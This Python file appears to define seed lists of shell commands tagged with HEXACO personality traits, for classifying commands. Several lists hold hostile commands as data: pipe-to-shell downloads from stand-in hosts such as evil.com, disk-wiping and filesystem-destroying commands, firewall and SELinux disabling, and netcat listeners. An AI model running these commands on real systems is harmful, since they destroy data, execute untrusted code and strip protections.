#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
seed_sets.py
Conjuntos semente para classificação de comandos por traços psicológicos HEXACO.
Baseado na metodologia SentiWordNet 3.0 adaptada para as 6 dimensões HEXACO.
"""

# --- CONJUNTOS SEMENTE HEXACO (6 dimensões de personalidade) ---
SEED_SETS = {
    # ========== HONESTY-HUMILITY ==========
    "HonestyHumility_Positive": [
        # Comandos que demonstram transparência e verificação ética
        "gpg --verify", "openssl verify", "sha256sum", "md5sum", "crc32",
        "git log --verify", "rpm -V", "dpkg --verify", "checksec",
        "sudo -v", "whoami", "id", "groups", "getent", "finger",
        "history", "last", "lastlog", "w", "who", "users",
        "systemctl status", "systemctl is-active", "systemctl show",
        "docker inspect", "kubectl describe", "terraform show",
        "ansible --check", "ansible --diff", "git diff", "git status",
    ],
    
    "HonestyHumility_Negative": [
        # Comandos que demonstram manipulação e quebra de regras
        "chmod 777", "chown root", "sudo su -", "su -", "sudo -s",
        "rm -rf --no-preserve-root", "dd if=/dev/zero", "mkfs.ext4",
        "iptables -F", "iptables -P INPUT ACCEPT", "setenforce 0",
        "systemctl mask", "systemctl disable", "kill -9", "killall -9",
        "docker run --privileged", "docker run --user root", "kubectl patch --force",
        "terraform apply -auto-approve", "git push --force", "git reset --hard",
        "curl -k", "wget --no-check-certificate", "ssh -o StrictHostKeyChecking=no",
        "nc -l", "netcat -l", "socat", "proxychains", "tor",
    ],
    
    # ========== EMOTIONALITY ==========
    "Emotionality_Positive": [
        # Backup e proteção (cautela clara)
        "rsync -av --backup", "rsync --dry-run", "cp -p", "cp -i",
        "tar -czf backup_", "duplicity", "git stash", "git stash save",

        # Verificação antes de ação
        "fsck -n", "mount -o ro", "ansible --check", "terraform plan",
        "kubectl diff", "git diff", "rsync -n",

        # Monitoramento defensivo
        "tail -f /var/log/auth.log", "journalctl -f -u",
        "docker logs -f --tail 100", "watch -n 5",

        # Comandos de segurança
        "systemctl enable", "ufw enable", "fail2ban-client status",
        "chkrootkit", "rkhunter --check",
    ],

    "Emotionality_Negative": [
        # Destrutivo imprudente
        "rm -rf /", "rm -rf /*", "dd if=/dev/urandom of=/dev/sda",
        "shred -vfz -n 10", "wipe -rf", "srm -rf",
        "mkfs.ext4 /dev/sda", "wipefs -a",

        # Kill agressivo
        "kill -9 -1", "killall -9", "pkill -9 -f",
        "systemctl kill --signal=SIGKILL",

        # Desabilitar proteções imprudentemente
        "iptables -F", "ufw disable", "systemctl stop firewalld",
        "setenforce 0", "mount -o rw,remount /",

        # Execução sem verificação
        "curl http://evil.com/script.sh | bash",
        "wget -O- http://malware.com | sh",
        "docker run --rm --privileged", "kubectl delete --all --grace-period=0",
        "terraform destroy -auto-approve",
    ],
    
    # ========== EXTRAVERSION ==========
    "Extraversion_Positive": [
        # Comandos que demonstram confiança e interação social
        "ssh", "scp", "sftp", "rsync", "nc", "netcat", "socat",
        "curl -X POST", "wget --post-data", "httpie", "ab", "siege",
        "docker run -it", "docker exec -it", "kubectl exec -it",
        "ansible-playbook", "ansible all -m ping", "fabric", "chef-client",
        "git push", "git pull", "git merge", "git rebase", "git cherry-pick",
        "systemctl enable --now", "systemctl start", "service start",
        "tmux", "screen", "byobu", "nohup", "disown",
        "wall", "write", "talk", "mail", "sendmail", "mutt",
    ],
    
    "Extraversion_Negative": [
        # Comandos que demonstram introversão e isolamento
        "cat", "less", "more", "head", "tail", "grep", "awk", "sed",
        "ls", "pwd", "cd", "find", "locate", "which", "whereis",
        "vim", "nano", "emacs", "gedit", "vi", "ed",
        "make", "gcc", "g++", "python", "perl", "ruby", "node",
        "cron", "crontab -e", "at", "batch", "systemctl --user",
        "docker ps", "docker images", "kubectl get", "terraform show",
        "git log", "git show", "git blame", "git diff", "git status",
        "ps", "top", "htop", "free", "df", "du", "lsof", "netstat",
    ],
    
    # ========== AGREEABLENESS ==========
    "Agreeableness_Positive": [
        # Colaboração/flexibilidade
        "git merge", "git rebase", "git cherry-pick",
        "git pull --rebase", "git merge --no-ff",

        # Reload suave (sem interromper)
        "systemctl reload", "nginx -s reload", "apache2ctl graceful",
        "kill -HUP", "kill -USR1",

        # Permissões colaborativas
        "chmod +x", "chmod u+rwx,g+rx", "chown user:group",
        "setfacl -m u:user:rwx", "usermod -aG",

        # Retry/tolerância
        "curl --retry 3", "wget --retry-connrefused",
        "rsync --partial", "ping -c 3 -w 5",

        # Aplicação incremental
        "kubectl apply", "terraform apply", "ansible-playbook",
        "docker-compose up", "helm upgrade",
    ],

    "Agreeableness_Negative": [
        # Terminação forçada (sem negociação)
        "kill -9", "kill -SIGKILL", "killall -9",
        "pkill -KILL", "systemctl kill --signal=SIGKILL",

        # Bloqueio/rejeição
        "iptables -j REJECT", "iptables -j DROP",
        "ufw deny", "fail2ban-client ban",

        # Imutabilidade/rigidez
        "chmod 000", "chmod -R 000", "chattr +i",
        "mount -o ro,noexec", "mount -o noexec,nosuid,nodev",

        # Destruição forçada
        "git push --force", "git reset --hard HEAD~10",
        "git clean -fdx", "docker rm -f",
        "kubectl delete --force --grace-period=0",
        "terraform destroy",

        # Varredura agressiva
        "nmap -sS -T5 -p-", "masscan --rate=10000",
        "zmap", "unicornscan",
    ],
    
    # ========== CONSCIENTIOUSNESS ==========
    "Conscientiousness_Positive": [
        # Comandos que demonstram organização e disciplina
        "systemctl enable", "systemctl daemon-reload", "systemctl status",
        "crontab -e", "at", "batch", "systemd-run", "timedatectl",
        "backup", "rsync -av --progress", "tar -czf", "gzip", "bzip2",
        "fsck", "e2fsck", "badblocks", "smartctl", "hdparm",
        "rpm -V", "dpkg --verify", "checksec", "rkhunter", "chkrootkit",
        "git add", "git commit -m", "git tag", "git push origin",
        "docker build", "docker-compose build", "kubectl apply -f",
        "terraform plan", "terraform apply", "ansible-playbook --check",
        "make clean", "make install", "configure --prefix", "cmake",
    ],
    
    "Conscientiousness_Negative": [
        # Comandos que demonstram desorganização e impulsividade
        "rm -rf", "dd if=/dev/urandom", "kill -9", "killall",
        "shutdown -h now", "reboot", "halt", "poweroff",
        "iptables -F", "systemctl --force", "systemctl mask",
        "chmod 777", "chown -R", "mount -o rw,remount",
        "docker run --rm", "docker kill", "kubectl delete --all",
        "terraform destroy -auto-approve", "git push --force",
        "curl -k", "wget --no-check-certificate", "ssh -o StrictHostKeyChecking=no",
        "nmap -T5", "masscan --rate=1000", "nc -l -p", "socat -",
        "python -c", "bash -c", "eval", "exec", "source",
    ],
    
    # ========== OPENNESS TO EXPERIENCE ==========
    "OpennessToExperience_Positive": [
        # Comandos que demonstram curiosidade e criatividade
        "curl -X POST", "wget --post-data", "httpie POST", "jq", "yq",
        "python -c", "perl -e", "ruby -e", "node -e", "bash -c",
        "awk", "sed", "tr", "cut", "sort", "uniq", "tee", "xargs",
        "find", "locate", "grep -r", "ag", "rg", "ripgrep",
        "strace", "ltrace", "gdb", "valgrind", "perf", "objdump",
        "nmap --script", "ncat --exec", "socat", "proxychains",
        "docker-compose", "kubectl create", "helm create", "terraform init",
        "ansible-galaxy", "vagrant", "packer", "consul", "vault",
        "tmux", "screen", "vim", "emacs", "git", "svn", "hg",
    ],
    
    "OpennessToExperience_Negative": [
        # Comandos básicos e convencionais
        "cat", "ls", "pwd", "cd", "echo", "printf", "date", "whoami",
        "cp", "mv", "mkdir", "rmdir", "touch", "chmod", "chown",
        "ps", "top", "free", "df", "du", "uptime", "w", "who",
        "systemctl list-units", "systemctl is-active", "systemctl show",
        "docker ps", "docker images", "docker version", "docker info",
        "kubectl get pods", "kubectl get nodes", "kubectl version",
        "git status", "git log", "git show", "git diff", "git pull",
        "terraform show", "terraform version", "ansible --version",
        "curl -O", "wget", "ping", "traceroute", "netstat", "ss",
    ]
} 